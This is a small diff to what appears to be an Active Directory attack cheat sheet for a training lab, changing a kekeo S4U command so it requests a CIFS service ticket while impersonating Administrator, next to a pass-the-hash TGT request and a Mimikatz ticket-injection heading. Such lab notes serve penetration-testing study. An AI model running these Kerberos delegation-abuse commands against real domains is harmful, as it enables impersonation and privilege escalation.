@@ -948,7 +948,7 @@ Tgt::ask /user:<username> /domain:<domain> /rc4:<hash>
 
 #### Requesting TGS with kekeo
 ```
-Tgs::s4u /tgt:<tgt> /user:<username>@<domain> /service:cifs/dcorp-mssql.dollarcorp.moneycorp.local
+Tgs::s4u /tgt:<tgt> /user:Administrator@<domain> /service:cifs/dcorp-mssql.dollarcorp.moneycorp.local
 ```
 
 #### Use Mimikatz to inject the TGS ticket
